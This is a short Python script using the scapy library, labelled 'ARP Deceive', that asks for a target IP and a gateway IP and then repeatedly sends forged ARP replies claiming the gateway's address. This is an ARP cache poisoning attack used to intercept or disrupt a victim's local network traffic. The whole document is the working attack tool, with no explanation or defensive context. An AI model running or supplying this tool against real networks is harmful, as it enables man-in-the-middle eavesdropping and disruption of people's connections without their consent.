from scapy.all import *

import os

def arp_deceive():
	
	clear = os.system('clear')

	print("**************************************")
	print("            ARP Deceive")
	print("**************************************")
	print("Please input your target's IP")
	target = input("[ARP Deceive]#")

	print("Please input Gate IP ")

	gate = input("[ARP Deceive]#")
	

	try:
		while True:
			
			packet = ARP(psrc=gate,pdst=target,op=2)
			srloop(packet)
	except KeyboardInterrupt:
		print("Ctrl + C detected....")


arp_deceive()
